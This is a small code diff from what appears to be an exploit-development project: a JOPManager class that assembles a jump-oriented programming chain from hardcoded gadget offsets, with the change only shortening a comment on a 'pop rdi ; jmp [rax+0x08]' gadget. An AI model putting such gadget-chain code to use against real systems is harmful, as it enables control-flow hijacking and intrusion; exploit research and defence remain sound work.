@@ -37,7 +37,7 @@ void JOPManager::Build(UINT64 g1Off_, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off) 
     slots.clear();
     allocPtr = SCRATCH_ALLOC_START;
     g1Off    = g1Off_;
-    setupOff = 0x0003ea4ec; // pop rdi ; jmp [rax+0x08]  (skip mov ebp/rsi/add rsp instructions)
+    setupOff = 0x0003ea4ec; // pop rdi ; jmp [rax+0x08]
 
     if (!scratchBase) {
         DbgLog("[JOPManager::Build] FAIL: scratchBase not set\n");
